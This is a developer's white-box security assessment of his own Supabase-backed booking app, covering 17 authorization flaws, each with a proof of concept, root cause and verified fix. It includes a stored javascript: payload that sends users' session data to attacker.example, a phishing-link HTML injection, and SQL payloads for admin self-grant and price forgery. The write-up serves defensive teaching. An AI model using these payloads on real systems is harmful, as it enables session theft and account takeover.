# Row Level Security Escape Hatches

**A security assessment of SERVI's Supabase backend: 17 findings, each with
a working proof of concept, a root cause and a verified fix.**

| | |
|---|---|
| **Target** | SERVI, a service-booking app (Expo/React Native + Supabase) |
| **Scope** | Postgres Row Level Security, grants, triggers, Storage policies, Edge Functions, email templates, client link handling |
| **Method** | Manual white-box review of every migration and policy, then exploitation as a normal signed-in user or `anon` |
| **Result** | 4 Critical · 5 High · 7 Medium · 1 Low. **All 17 fixed and re-tested** |
| **Author** | Fares Kamal (developer and owner of SERVI) |

## Summary

SERVI has no custom backend. The mobile app talks straight to Postgres
through Supabase's REST API (PostgREST), so Row Level Security policies are
the **entire** authorization boundary. Any gap in a policy can be exploited
by anyone who signs up.

Every PoC here is a request a normal client could send. None of them needs
the service-role key or any other secret. The most serious findings let any
user:

- **become an admin** (POC-7) or change their own account type (POC-1)
- **skip the business approval review** entirely (POC-8, POC-9)
- **steal another user's session** through a stored `javascript:` link (POC-10)
- **phish the admin** with a fake "Approve" button injected into a system email (POC-11)
- **forge prices, booking status and durations** to get free services or block a
  competitor's calendar (POC-3, POC-12)

The work ran in two rounds. **Round 1** (POC-1 to POC-6) was the first
audit of the RLS policies. **Round 2** (POC-7 to POC-17) came from
pre-launch reviews after the app added an admin role, a business approval
gate, email notifications and phone numbers. Most new features reopened the
same kind of hole round 1 had closed.

## Authorization and ethics

I built SERVI and own its Supabase project. All testing was done on my own
system with my own test accounts. Every SQL payload ran inside
`begin; ... rollback;` so nothing persisted, and no real user's data was
read or changed. Every issue was fixed before this write-up was published.
Nothing here targets a third-party system.

## Findings

Mapped to [CWE](https://cwe.mitre.org/) and the
[OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
or [OWASP Top 10 (2021)](https://owasp.org/Top10/).

| # | Severity | Finding | CWE | OWASP | Status |
|---|---|---|---|---|---|
| **Round 1** | | | | | |
| [POC-1](#poc-1--self-role-escalation-via-profilesrole) | **Critical** | Self role escalation via `profiles.role` | CWE-269 | API3 | Fixed |
| [POC-2](#poc-2--customer-self-confirms-their-own-booking) | High | Customer self-confirms their own booking | CWE-915 | API3 | Fixed |
| [POC-3](#poc-3--booking-price-forgery-via-booking_services) | High | Booking price forgery via `booking_services` | CWE-602 | API6 | Fixed |
| [POC-4](#poc-4--review-posted-against-a-never-completed-booking) | Medium | Review posted against a never-completed booking | CWE-840 | API6 | Fixed |
| [POC-5](#poc-5--system-wide-cron-function-callable-by-anon) | Medium | System-wide cron function callable by `anon` | CWE-732 | API5 | Fixed |
| [POC-6](#poc-6--conversation-hijack-via-participant-reassignment) | Medium | Conversation hijack via participant reassignment | CWE-639 | API1 | Fixed |
| **Round 2** | | | | | |
| [POC-7](#poc-7--any-user-grants-themselves-admin-via-profilesis_admin) | **Critical** | Any user grants themselves admin via `profiles.is_admin` | CWE-269 | API3 | Fixed |
| [POC-8](#poc-8--business-inserted-already-approved) | **Critical** | Business inserted already `approved`, skipping review | CWE-915 | API3 | Fixed |
| [POC-9](#poc-9--business-reads-its-own-approval-token-and-self-approves) | **Critical** | Business reads its own approval token and self-approves | CWE-200 | API3 | Fixed |
| [POC-10](#poc-10--stored-javascript-link-runs-in-a-customers-session) | High | Stored `javascript:` link runs in a customer's session | CWE-79 | A03 | Fixed |
| [POC-11](#poc-11--html-injection-into-the-admins-approval-email) | High | HTML injection into the admin's approval email | CWE-80 | A03 | Fixed |
| [POC-12](#poc-12--forged-booking-insert) | High | Forged booking insert (status, staff, duration) | CWE-602 | API6 | Fixed |
| [POC-13](#poc-13--one-completed-booking-reviews-any-business) | Medium | One completed booking reviews *any* business | CWE-639 | API1 | Fixed |
| [POC-14](#poc-14--customer-reactivates-a-booking-the-business-cancelled) | Medium | Customer reactivates a booking the business cancelled | CWE-840 | API6 | Fixed |
| [POC-15](#poc-15--customer-marks-their-own-phone-number-verified) | Medium | Customer marks their own phone number "verified" | CWE-915 | API3 | Fixed |
| [POC-16](#poc-16--unapproved-business-data-publicly-readable) | Medium | Unapproved business's services/staff/photos publicly readable | CWE-200 | API1 | Fixed |
| [POC-17](#poc-17--avatar-bucket-lists-every-user-id) | Low | Avatar bucket lists every user id | CWE-548 | API8 | Fixed |

**Severity** reflects impact on this app: who can exploit the bug (any
signed-up user, or a business owner) and what they gain (admin rights,
another user's session, money, or someone else's data).

## Methodology

1. **Inventory.** Listed every table, policy, grant, `SECURITY DEFINER`
   function, trigger and Storage policy from the migrations and the live
   catalog (`pg_policies`, `information_schema`, `has_function_privilege`).
2. **Threat model.** For each table, asked what a customer, a business owner
   and an anonymous visitor should be able to read and write, column by
   column, and compared that with what the policy actually allows.
3. **Exploit.** Wrote each suspected gap as a payload and ran it as the
   attacker role (method below). A finding only counts if the payload
   worked.
4. **Fix.** Fixed the database first (triggers, constraints, policies,
   moving secrets into their own tables), and the client second where needed.
5. **Re-test.** Re-ran the same payload and recorded the post-fix error,
   plus a control test to show the legitimate app path still works.

**Tools:** PostgreSQL / psql, Supabase SQL editor and MCP, PostgREST over
`curl`, the Supabase Security Advisor, and reading the code.

## Why this class of bug exists

An architecture with no application server in front of Postgres is
completely valid — but it raises the stakes on every single RLS policy: a
gap here isn't "one more layer to defend," it's the whole wall. Postgres
RLS's `USING` clause governs which rows are *visible*; `WITH CHECK` governs
what the *new* row may look like. Skip `WITH CHECK` on an UPDATE policy and
Postgres silently reuses `USING` for it — which only re-confirms "is this
still my row," never "did I only change the columns the UI meant to
expose." Every round-1 finding is a variation on that one gap. Round 2
adds the other places user input crosses a trust boundary: HTML emails,
browser URLs and Storage.

## Reproducing these without a real device or JWT

Every payload below runs as plain SQL against the database, wrapped in
`begin; ... rollback;` so nothing persists. The two lines that matter:

```sql
set local role authenticated;
set local request.jwt.claim.sub = '<uuid>';
```

Supabase's `auth.uid()` is just:

```sql
select coalesce(
  nullif(current_setting('request.jwt.claim.sub', true), ''),
  (nullif(current_setting('request.jwt.claims', true), '')::jsonb ->> 'sub')
)::uuid
```

— so setting that GUC directly simulates exactly what PostgREST sets from a
real user's JWT. No token, no client, no real device needed to test any
Supabase RLS policy this way.

---

## POC-1 — Self role escalation via `profiles.role`

**Severity: Critical**

`profiles`'s UPDATE policy checked only `auth.uid() = id` — no `WITH CHECK`
at all. Nothing stopped a customer account from setting its own `role`
straight to `'business'`, gaining a full business dashboard with no approval
step, fully reversible back to `'customer'` the same way.

**Vulnerable policy (before):**

```sql
create policy "profiles are updatable by their owner"
  on profiles for update
  using (auth.uid() = id);
  -- no WITH CHECK — any column, including role, was fair game
```

**Payload — run as the victim's own session:**

```sql
begin;
set local role authenticated;
set local request.jwt.claim.sub = '<my-own-customer-uuid>';

update profiles set role = 'business' where id = '<my-own-customer-uuid>';
-- pre-fix: 1 row updated. next app load routes into the business tree.
```

**Post-fix result — captured against the live database:**

```
ERROR:  P0001: role cannot be changed after signup
CONTEXT:  PL/pgSQL function prevent_role_change() line 4 at RAISE
```

**Fix:** a `BEFORE UPDATE` trigger that compares `NEW.role` against
`OLD.role` directly — something a bare RLS policy can't do, since
`WITH CHECK` only ever sees the incoming row:

```sql
create function prevent_role_change()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  if new.role is distinct from old.role then
    raise exception 'role cannot be changed after signup';
  end if;
  return new;
end;
$$;

create trigger lock_profile_role
  before update on profiles
  for each row execute procedure prevent_role_change();
```

---

## POC-2 — Customer self-confirms their own booking

**Severity: High**

The `bookings` UPDATE policy let the owning customer touch *any* column on
their own row, not just `start_time`/`status` the reschedule/cancel screens
actually send. That includes `status` itself — a customer could jump their
own booking straight to `'confirmed'` or `'completed'`, skipping the
business's real confirmation and firing the same server-side notification
triggers a legitimate confirmation would.

**Payload:**

```sql
begin;
set local role authenticated;
set local request.jwt.claim.sub = '<my-own-customer-uuid>';

update bookings set status = 'confirmed' where id = '<my-own-completed-booking>';
```

**Post-fix result — captured against the live database:**

```
ERROR:  P0001: customers may only set booking status to pending or cancelled
CONTEXT:  PL/pgSQL function enforce_booking_update_rules() line 26 at RAISE
```

**Control — the legitimate reschedule shape still works, unmodified:**

```sql
begin;
set local role authenticated;
set local request.jwt.claim.sub = '<my-own-customer-uuid>';

update bookings set start_time = now() + interval '3 days', status = 'pending'
where id = '<my-own-booking>';
-- result: status | pending, start_time | (new value) — succeeds
```

**Fix:** a role-aware `BEFORE UPDATE` trigger that pins every immutable
column (`customer_id`, `business_id`, `service_id`, `staff_id`,
`total_price`, `total_duration_minutes`) and only lets the customer's own
status land on `pending`/`cancelled` — `confirmed`/`completed` is
business-only, matching exactly what the app's own mutations do, nothing
more.

---

## POC-3 — Booking price forgery via `booking_services`

**Severity: High**

Booking creation inserted `price` and `duration_minutes` straight from
client state — the INSERT policy checked only that the caller owned the
parent booking, never that the price actually matched the referenced
service. A modified client could book any real service at any price,
including a fraction of a cent.

**Payload — the service's real price is 40.00 / 45 min:**

```sql
begin;
set local role authenticated;
set local request.jwt.claim.sub = '<my-own-customer-uuid>';

insert into booking_services (booking_id, service_id, price, duration_minutes, position)
values ('<my-booking>', '<real-service-id>', 0.01, 99999, 0)
returning price, duration_minutes;
```

**Post-fix result — captured against the live database:**

```sql
-- row inserted (RLS doesn't reject it — the INSERT is legitimately owned),
-- but the total tells the real story:
select total_price, total_duration_minutes from bookings where id = '<my-booking>';
--> total_price: 80.00, total_duration_minutes: 90
-- (this booking's original total was 40.00 / 45 — the new row was
-- silently corrected to the SAME real service price/duration, not the
-- 0.01 / 99999 the payload sent)
```

**Fix:** a `BEFORE INSERT` trigger on `booking_services` re-derives
price/duration from the real `services`/`packages` rows, discarding
whatever the client sent; an `AFTER INSERT` trigger then resyncs
`bookings.total_price`/`total_duration_minutes` from the true sum. No
client code had to change — the numbers it sends just stopped being
trusted.

---

## POC-4 — Review posted against a never-completed booking

**Severity: Medium**

The review form only renders client-side for `status = 'completed'`
bookings — the INSERT policy never checked status at all, so a review could
be attached to a booking that was merely `pending` or even `cancelled`.

**Payload — against a booking with `status = 'cancelled'`:**

```sql
begin;
set local role authenticated;
set local request.jwt.claim.sub = '<my-own-customer-uuid>';

insert into reviews (booking_id, customer_id, business_id, rating, comment)
values ('<cancelled-booking>', '<my-uuid>', '<business-id>', 5, 'never happened');
```

**Post-fix result — captured against the live database:**

```
ERROR:  42501: new row violates row-level security policy for table "reviews"
```

**Fix:** the INSERT policy now joins back to `bookings` and requires
`status = 'completed'`, matching what the UI already assumed.

---

## POC-5 — System-wide cron function callable by `anon`

**Severity: Medium**

`send_booking_reminders()` loops over every business's upcoming bookings and
messages customers — meant to run only from `pg_cron`. It was explicitly
granted to `authenticated` "for testing," but that grant was already
redundant: Postgres grants `EXECUTE` to `PUBLIC` by default on function
creation, and Supabase layers its own default grant to
`anon`/`authenticated` on top of that — independently of each other. Three
separate things had to be revoked, not one.

**Checking who could actually call it** (a straight privilege check, no
session simulation needed):

```sql
select has_function_privilege('anon', p.oid, 'EXECUTE') as anon_can_exec,
       has_function_privilege('authenticated', p.oid, 'EXECUTE') as authenticated_can_exec
from pg_proc p where p.proname = 'send_booking_reminders';

--> anon_can_exec: true, authenticated_can_exec: true
```

**First revoke attempt — incomplete:**

```sql
revoke execute on function send_booking_reminders() from authenticated;
-- re-checked: anon_can_exec was STILL true — the PUBLIC default grant
-- and Supabase's own anon default grant are each independent of the
-- authenticated-specific revoke above.
```

**Actual fix — all three explicitly:**

```sql
revoke execute on function send_booking_reminders() from public;
revoke execute on function send_booking_reminders() from anon;
revoke execute on function send_booking_reminders() from authenticated;

-- re-checked: anon_can_exec: false, authenticated_can_exec: false,
--             postgres_can_exec: true, service_role_can_exec: true
```

pg_cron keeps working unaffected — the function owner (`postgres`, who ran
`cron.schedule`) always retains implicit `EXECUTE` regardless of grants to
other roles.

---

## POC-6 — Conversation hijack via participant reassignment

**Severity: Medium**

Same shape as POC-1/2, smaller blast radius. A conversation participant
legitimately updating their own read-receipt timestamp could, in principle,
also rewrite `customer_id` or `business_id` on that row — and even giving
the update policy a matching `WITH CHECK` doesn't close this, since a
business owner keeping their own `business_id` unchanged still passes the
ownership check no matter what they set `customer_id` to:

```sql
with check (
  auth.uid() = customer_id
  or exists (select 1 from businesses where businesses.id = conversations.business_id
             and businesses.owner_id = auth.uid())
)
-- a business owner setting customer_id to ANY other uuid still passes —
-- the second branch only checks business_id, which they didn't touch
```

**Actual fix — a trigger, not another RLS clause:**

```sql
create function lock_conversation_participants()
returns trigger language plpgsql as $$
begin
  if new.customer_id is distinct from old.customer_id
    or new.business_id is distinct from old.business_id then
    raise exception 'conversation participants cannot be changed after creation';
  end if;
  return new;
end; $$;
```

---

# Round 2

The round-1 fixes held. Round 2 is what happened next: the app grew an
admin role, a business-approval gate (new businesses stay hidden until an
admin approves them), approval emails with one-click links, phone numbers,
and stored links. Each one added columns or tables, and most of them had the
same gap as round 1: a check on **who** owns the row, with no check on
**what** they are allowed to write into it.

The post-fix errors below are the exact messages the fix functions raise.
The `set local role` method above was used to test the fixes for POC-8, 9,
12, 13, 14 and 15 against the live database. The other post-fix results
show what the fix code does.

---

## POC-7 — Any user grants themselves admin via `profiles.is_admin`

**Severity: Critical**

POC-1's fix locked `profiles.role`. Later, the app added `profiles.is_admin`
to the same table, to unlock an admin screen that approves new businesses.
Nobody locked the new column. The owner UPDATE policy still allowed any
column, so any signed-in user could make themselves an admin. As an admin
they could then approve their own business and read admin-only data.

**Payload:**

```sql
begin;
set local role authenticated;
set local request.jwt.claim.sub = '<my-own-uuid>';

update profiles set is_admin = true where id = '<my-own-uuid>';
-- pre-fix: 1 row updated. The admin screen and every is_admin-gated
-- policy now open up for this account.
```

**Post-fix result:**

```
ERROR:  P0001: is_admin cannot be changed from the app
```

**Fix:** the same trigger pattern as POC-1. It rejects any change to
`is_admin` made through the public API roles. Admins can now only be granted
from the SQL editor or with the service role:

```sql
create or replace function prevent_admin_self_grant()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  if coalesce(auth.role(), '') in ('anon', 'authenticated') then
    if tg_op = 'INSERT' and new.is_admin then
      raise exception 'is_admin cannot be set from the app';
    end if;
    if tg_op = 'UPDATE' and new.is_admin is distinct from old.is_admin then
      raise exception 'is_admin cannot be changed from the app';
    end if;
  end if;
  return new;
end; $$;

create trigger lock_profile_admin
  before insert or update on profiles
  for each row execute function prevent_admin_self_grant();
```

The migration ended by listing every current admin, so the owner could check
that nobody had already used the hole.

**Lesson:** a lock on one column doesn't cover the next column someone adds
to the same table. When you add a privileged column, ask "who can write
this?" again.

---

## POC-8 — Business inserted already `approved`

**Severity: Critical**

New businesses start as `approval_status = 'pending'`, stay hidden from
customers, and trigger an email to the admin. A `prevent_self_approval`
trigger stopped owners from *changing* `approval_status`, but it only ran
`BEFORE UPDATE`. The INSERT was never checked. An owner could create their
business already approved. That skipped the review, and because the admin
email only fires for `'pending'` rows, the admin was never told.

The same trigger also missed `rejected_at`. Rejected businesses are deleted
48 hours after `rejected_at`, so an owner could set it to `null` and never be
deleted.

**Payloads:**

```sql
begin;
set local role authenticated;
set local request.jwt.claim.sub = '<business-owner-uuid>';

-- 1. Skip review entirely
insert into businesses (owner_id, name, categories, maps_url, approval_status)
values ('<business-owner-uuid>', 'Totally Legit Salon', '{salon}',
        'https://maps.app.goo.gl/x', 'approved')
returning approval_status;
-- pre-fix: approved. Listed to customers immediately, no admin email.

-- 2. Dodge the 48h auto-delete after a rejection
update businesses set rejected_at = null where owner_id = '<business-owner-uuid>';
```

**Post-fix result:**

```
-- 1. The insert succeeds, but the row comes back coerced:
--> approval_status: pending   (the admin email fires as normal)

-- 2.
ERROR:  P0001: Only an admin can change approval_status
```

**Fix:** the trigger now runs `BEFORE INSERT OR UPDATE`. On insert it
*coerces* the row rather than raising an error. A new business always starts
pending, so a modified client still ends up in the normal review flow:

```sql
if tg_op = 'INSERT' then
  new.approval_status := 'pending';
  new.approved_at := null;
  new.rejected_at := null;
  return new;
end if;

if new.approval_status is distinct from old.approval_status
   or new.approved_at is distinct from old.approved_at
   or new.rejected_at is distinct from old.rejected_at then
  raise exception 'Only an admin can change approval_status';
end if;
```

**Lesson:** a guard trigger that only covers `UPDATE` can be skipped by
writing the forbidden value at `INSERT` time.

---

## POC-9 — Business reads its own approval token and self-approves

**Severity: Critical**

The admin's new-business email has one-click **Approve** / **Reject**
buttons. They call a public Edge Function that runs without a JWT, because
email links can't carry one. The only thing that function trusted was a
per-business secret, `businesses.approval_token`, placed in the link.

That token was stored as a column on `businesses`, and the owner can read
and write their own `businesses` row.

**Payload — two requests, no special tools:**

```
GET /rest/v1/businesses?select=id,approval_token&owner_id=eq.<my-uuid>
--> [{"id":"<my-business>","approval_token":"<secret>"}]

GET /functions/v1/approve-bussiness?id=<my-business>&token=<secret>
--> "<My business> is approved!"
```

**The first fix didn't work.** A column-level revoke ran without error and
did nothing:

```sql
revoke select (approval_token) on businesses from anon, authenticated;
-- information_schema.column_privileges still listed both roles.
```

Supabase gives `anon`/`authenticated` a table-wide grant on `businesses`, and
a table grant covers every column. A column-level revoke can't remove access
that the table-level grant already gives.

**The second fix worked in SQL and broke the app.** The next attempt revoked
the table grant and re-granted every column except the token. A SQL test
with an explicit column list passed. But PostgREST's `select=*`, which the
app uses everywhere, does not fall back to "the columns you can see". It
fails outright:

```
GET /rest/v1/businesses?select=*
--> 42501 permission denied for table businesses
```

Business signup broke in production right away.

**Actual fix:** move the secret out of the client-visible table:

```sql
create table business_approval_tokens (
  business_id uuid primary key references businesses (id) on delete cascade,
  token uuid not null default gen_random_uuid()
);
alter table business_approval_tokens enable row level security;
-- no policies at all, and no grants: service role / triggers only
revoke all on business_approval_tokens from anon, authenticated, public;

alter table businesses drop column approval_token;
grant select, insert, update on businesses to anon, authenticated;
```

**Post-fix result:**

```
GET /rest/v1/business_approval_tokens?select=*
--> 42501 permission denied for table business_approval_tokens
GET /rest/v1/businesses?select=*
--> 200, full rows (no token column exists any more)
```

**Lesson:** RLS controls which rows a user can see. It doesn't hide
individual columns. A secret belongs in its own table with no client access.
And test a grant change with a real REST call (`select=*`,
`RETURNING *`), not just a SQL query with an explicit column list.

---

## POC-10 — Stored `javascript:` link runs in a customer's session

**Severity: High**

Businesses paste a Google Maps link (`maps_url`), and customers tap "Get
directions" to open it. On native that's harmless. On web, React Native's
`Linking.openURL` calls `window.open`, and `window.open('javascript:...')`
runs that script on the app's own site.

The column accepted any text, so a business could store a script as its
"Maps link". When a customer tapped it, the script could read their session
from the page's `sessionStorage` and send it anywhere. `logo_url`,
`avatar_url`, `photo_url` and gallery `image_url` had the same problem.

**Payload — as a business owner, against their own row:**

```sql
update businesses
set maps_url = 'javascript:fetch(''https://attacker.example/?s=''+encodeURIComponent(JSON.stringify(sessionStorage)))'
where owner_id = '<my-uuid>';
-- pre-fix: 1 row updated; every customer tapping "Get directions" on web
-- sends their stored Supabase session to attacker.example
```

**Post-fix result:**

```
ERROR:  23514: new row for relation "businesses" violates check constraint
        "businesses_maps_url_https"
```

**Fix — two layers:**

```sql
alter table businesses
  add constraint businesses_maps_url_https
  check (maps_url is null or (maps_url ~* '^https://' and char_length(maps_url) <= 500))
  not valid;
-- same for logo_url, profiles.avatar_url, staff.photo_url, gallery image_url
```

and on the client, every user-supplied link now goes through one helper that
only opens `https:` URLs. A raw `Linking.openURL(userValue)` call is never
used:

```ts
export function openExternalLink(url: string | null | undefined): void {
  if (!url) return;
  let parsed: URL;
  try { parsed = new URL(url.trim()); } catch { return; }
  if (parsed.protocol !== "https:") return;
  Linking.openURL(parsed.toString()).catch(() => {});
}
```

`NOT VALID` means the database doesn't check existing rows when the
constraint is added. New writes are still checked, and the client helper
covers any old rows.

---

## POC-11 — HTML injection into the admin's approval email

**Severity: High**

When a business signs up, a Postgres trigger emails the admin through Resend
with the business's name, description, address and Maps link, plus
Approve/Reject buttons. Every one of those fields was inserted into the
email's HTML without escaping, and the business owner controls all of them.

**Payload — a business name:**

```sql
insert into businesses (owner_id, name, categories, maps_url)
values (
  '<my-uuid>',
  'Salon</p><p><a href="https://attacker.example/approve" style="background:#000;color:#fff;padding:12px 20px">Approve this business</a></p><p>',
  '{salon}',
  'https://maps.app.goo.gl/x'
);
```

Before the fix, the admin's inbox showed an extra button that looked real.
This attacks the one human decision point the approval process relies on: a
convincing link to a phishing page, or a tracking pixel to learn when the
admin read the email.

**Fix:** one escaping helper, used on every user-controlled value in every
email trigger:

```sql
create or replace function html_escape(input text)
returns text language sql immutable as $$
  select coalesce(
    replace(replace(replace(replace(replace(input,
      '&', '&amp;'), '<', '&lt;'), '>', '&gt;'), '"', '&quot;'), '''', '&#39;'),
    '');
$$;

-- ... '<p><strong>' || html_escape(new.name) || '</strong></p>' ...
```

**Post-fix result:** the same payload now shows up in the email as plain
visible text (`Salon&lt;/p&gt;&lt;p&gt;&lt;a href=...`), not as a button.

**Lesson:** a database trigger that builds HTML is a template engine with
no escaping. RLS decides who can write a column. It doesn't make what they
wrote safe.

---

## POC-12 — Forged booking insert

**Severity: High**

Round 1 locked down booking *updates* (POC-2) and booking *line items*
(POC-3). The booking row's own INSERT only checked
`auth.uid() = customer_id`, so every other column came straight from the
client:

**Payloads:**

```sql
begin;
set local role authenticated;
set local request.jwt.claim.sub = '<my-own-customer-uuid>';

-- a) Born completed: skips the business entirely, and unlocks the review
--    form POC-4's fix was meant to gate
insert into bookings (customer_id, business_id, service_id, start_time, status)
values ('<me>', '<business>', '<its-service>', now() - interval '1 day', 'completed');

-- b) Block a competitor's calendar: one booking that lasts ~70 days
insert into bookings (customer_id, business_id, service_id, start_time, total_duration_minutes)
values ('<me>', '<rival-business>', '<its-service>', now() + interval '1 day', 100000);

-- c) Book a stylist who works for a *different* business, blocking that
--    stylist's slots at their real employer via the booked_slots view
insert into bookings (customer_id, business_id, service_id, staff_id, start_time)
values ('<me>', '<business-a>', '<a-service>', '<staff-of-business-b>', now() + interval '1 day');

-- d) Book a business that hasn't been approved yet
```

**Post-fix result:**

```
a) inserted, but status comes back 'pending'
b) inserted, but total_duration_minutes comes back as the service's real 45
c) ERROR:  P0001: Staff member does not belong to this business
d) ERROR:  P0001: This business is not accepting bookings
```

**Fix:** a `BEFORE INSERT` trigger on `bookings`, the INSERT version of
POC-2's update guard:

```sql
if not exists (select 1 from businesses
               where id = new.business_id and approval_status = 'approved') then
  raise exception 'This business is not accepting bookings';
end if;

select business_id, price, duration_minutes into primary_service
  from services where id = new.service_id;
if primary_service is null or primary_service.business_id <> new.business_id then
  raise exception 'Service does not belong to this business';
end if;

if new.staff_id is not null and not exists (
    select 1 from staff where id = new.staff_id
      and business_id = new.business_id and active) then
  raise exception 'Staff member does not belong to this business';
end if;

new.status := 'pending';
new.total_price := primary_service.price;               -- never trust client totals
new.total_duration_minutes := primary_service.duration_minutes;
```

The POC-3 trigger then sets the real cart totals as the line items are
inserted. It now also checks that each item belongs to the booking's own
business, and that items can only be added while the booking is still
`pending`.

---

## POC-13 — One completed booking reviews *any* business

**Severity: Medium**

POC-4's fix required the booking to be `completed`, but it never checked
that the review's `business_id` matched the booking's business. With one
real completed haircut, a customer could post unlimited one-star reviews on
every competitor, each against the same booking id with a different
`business_id`.

**Payload:**

```sql
insert into reviews (booking_id, customer_id, business_id, rating, comment)
values ('<my-real-completed-booking-at-A>', '<me>', '<competitor-B>', 1, 'awful');
-- pre-fix: inserted; shows on B's page and drags B's average rating
```

**Post-fix result:**

```
ERROR:  42501: new row violates row-level security policy for table "reviews"
```

**Fix:** one more condition in the join:

```sql
create policy "reviews are insertable by the customer who booked"
  on reviews for insert
  with check (
    auth.uid() = customer_id
    and exists (
      select 1 from bookings
      where bookings.id = reviews.booking_id
        and bookings.customer_id = auth.uid()
        and bookings.business_id = reviews.business_id   -- the missing line
        and bookings.status = 'completed'
    )
  );
```

**Lesson:** when a row stores the same relationship twice (`booking_id` and
`business_id`), the policy has to check that the two agree.

---

## POC-14 — Customer reactivates a booking the business cancelled

**Severity: Medium**

POC-2's fix limited the customer to setting `status` to `pending` or
`cancelled`, which is what rescheduling needs. But it didn't check the
booking's current status. A booking the business had *cancelled*, or one
already *completed*, could be moved back to `pending` with a new time.

**Payload:**

```sql
update bookings set status = 'pending', start_time = now() + interval '2 days'
where id = '<booking-the-business-cancelled>';
```

**Post-fix result:**

```
ERROR:  P0001: only pending or confirmed bookings can be rescheduled or cancelled
```

**Fix:** check where the status is coming from, as well as where it's going:

```sql
if (new.status is distinct from old.status or new.start_time is distinct from old.start_time)
   and old.status not in ('pending', 'confirmed') then
  raise exception 'only pending or confirmed bookings can be rescheduled or cancelled';
end if;
```

---

## POC-15 — Customer marks their own phone number "verified"

**Severity: Medium**

Phone numbers live in `customer_phone_numbers` with a `verified` flag, and
businesses see the badge next to a customer's number. Originally only a
server-side function could write that table, after a real OTP check. When
OTP was paused, a customer INSERT/UPDATE policy was added so people could
just save a number. That policy checked row ownership only, so it also let
customers write `verified = true` themselves.

**Payload:**

```sql
insert into customer_phone_numbers (customer_id, phone, verified)
values ('<me>', '+201000000000', true)
returning verified;
```

**Post-fix result:**

```
--> verified: false
```

**Fix:** a trigger forces `verified := false` unless a transaction-local
flag is set. Only the real verification functions set that flag, and a
client can't set it through PostgREST:

```sql
create or replace function prevent_client_set_phone_verified()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  if coalesce(current_setting('servi.internal_phone_verify', true), 'false') <> 'true' then
    new.verified := false;
  end if;
  return new;
end; $$;

-- inside verify_whatsapp_code(), only after the code matches:
perform set_config('servi.internal_phone_verify', 'true', true);
insert into customer_phone_numbers (...) values (..., true, ...) on conflict ...;
perform set_config('servi.internal_phone_verify', 'false', true);
```

**Lesson:** loosening a policy "temporarily" opens every column the policy
covers, not just the one you meant to open.

---

## POC-16 — Unapproved business data publicly readable

**Severity: Medium (information disclosure)**

The approval gate hid the `businesses` row of a pending business. But every
table linked to a business (`services`, `staff`, `staff_hours`,
`staff_blocks`, `staff_services`, `business_hours`,
`business_gallery_images`, `service_categories`, `packages`,
`package_services`, `loyalty_promotions`) and the `business-images` storage
bucket still had their original `using (true)` read policies. Anyone with
the anon key and a business id could read an unvetted business's full menu,
staff names and photos.

**Payload — as `anon`:**

```
GET /rest/v1/businesses?id=eq.<pending-business>         --> []   (hidden, correct)
GET /rest/v1/staff?business_id=eq.<pending-business>     --> [ {name, photo_url, ...}, ... ]
GET /rest/v1/services?business_id=eq.<pending-business>  --> [ ... ]
```

**Fix:** each child table's read policy now joins back to its business and
applies the same rule as the parent. Tables two steps away from
`businesses` (staff → business, package → business) join through both:

```sql
create policy "staff are publicly readable" on staff for select using (
  exists (select 1 from businesses
          where businesses.id = staff.business_id
            and (businesses.approval_status = 'approved'
                 or businesses.owner_id = auth.uid()
                 or exists (select 1 from profiles
                            where profiles.id = auth.uid() and profiles.is_admin)))
);
```

**Post-fix result:** the same `anon` requests now return `[]` for every child
table.

**Lesson:** hiding a parent row doesn't hide its child rows. Each child table
needs its own read policy. Setting a new child table to `using (true)` by
default leaks whatever the parent was hiding.

---

## POC-17 — Avatar bucket lists every user id

**Severity: Low**

Profile photos are stored at `avatars/<user-id>/avatar-<ts>.jpg`. The
bucket's SELECT policy was `bucket_id = 'avatars'`, which allows *listing*
files as well as fetching them. Listing the bucket returned every
user's id. The Supabase Security Advisor flagged this ("Public Bucket Allows
Listing").

**Payload — as `anon`:**

```
POST /storage/v1/object/list/avatars   {"prefix": ""}
--> [{"name":"<uuid-1>"}, {"name":"<uuid-2>"}, ...]
```

**Fix:** only allow owners to list their own folder. Avatars still display
for everyone: URLs under `/object/public/...` skip RLS entirely, so nothing
user-facing changed:

```sql
create policy "users can read their own avatar files"
  on storage.objects for select
  using (
    bucket_id = 'avatars'
    and (storage.foldername(storage.objects.name))[1] = auth.uid()::text
  );
```

---

## The one-line takeaway

For anyone auditing their own Supabase schema: grep every `for update` or
`for all` policy for a missing `with check` — that's POC-1, 2, and 6 here.
Then ask, for every INSERT policy, whether it checks *who* is inserting
without checking whether the *values* they're inserting are true (POC-3).
Then check every `grant execute` against
`has_function_privilege('anon', ...)` directly rather than trusting the
grant statement you wrote — Postgres and Supabase both layer default
privileges you didn't ask for (POC-5).

The recurring lesson across round 1: RLS policies see either the old row
(`USING`) or the new row (`WITH CHECK`), never both at once — a trigger is
the only construct that can actually compare them.

Round 2 adds four more checks:

- **Every guard trigger: does it also run on `INSERT`?** (POC-8, POC-12)
- **Every privileged or secret column: does anything stop the row owner
  from reading or writing it?** RLS hides rows, not columns. Put secrets in
  their own table. (POC-7, POC-9, POC-15)
- **Every user-written value that ends up in HTML, an email or a URL: is it
  escaped or limited to an allowed scheme?** (POC-10, POC-11)
- **Every table linked to a gated parent: does its read policy repeat the
  parent's gate?** (POC-16)

---

## Skills demonstrated

- **Application security testing:** white-box review, threat modeling per
  role and per column, writing working PoCs for each finding
- **Database security:** PostgreSQL Row Level Security, grants and default
  privileges, `SECURITY DEFINER` functions, guard triggers, column-level
  security and why it fails with PostgREST
- **Web security:** stored XSS through URL schemes, HTML injection in email,
  phishing risk in admin workflows
- **Cloud / BaaS security:** Supabase Auth, Storage bucket policies, Edge
  Function authentication, the Security Advisor
- **Fix and verification:** fixed every finding in the database first, then
  proved each fix with the original payload and a control test
- **Reporting:** severity rating, CWE / OWASP mapping, root cause and a
  reusable audit checklist

## Related work

- [Entra ID Zero Trust lab](https://github.com/fareskamal11/Entra-id-zero-trust-lab):
  MFA, Conditional Access, RBAC, PIM and identity lifecycle in Microsoft Entra ID
- [Phishing detection](https://github.com/fareskamal11/fares-phishing-detection)

---

*All seventeen PoCs were run by the app's owner against SERVI's own
Supabase project, either as direct SQL simulating an authenticated session
with `set local role` + `request.jwt.claim.sub` (wrapped in `begin; ...
